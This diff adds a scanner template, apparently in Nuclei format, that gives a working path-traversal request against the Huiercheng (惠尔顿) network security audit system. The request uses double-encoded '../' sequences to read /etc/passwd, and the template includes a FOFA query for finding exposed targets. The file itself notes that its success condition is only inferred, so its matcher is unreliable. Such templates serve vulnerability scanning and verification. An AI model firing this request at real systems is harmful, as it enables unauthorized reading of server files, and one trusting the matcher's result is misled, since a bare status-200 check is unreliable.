@@ -1,0 +1,29 @@
+id: poc-zg056p9tg4csgyqv
+info:
+  name: 惠尔顿-网络安全审计系统存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zg056p9tg4csgyqv
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zg056p9tg4csgyqv
+    fofa: app="惠尔顿-网络安全审计系统"
+http:
+- raw:
+  - 'GET /download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
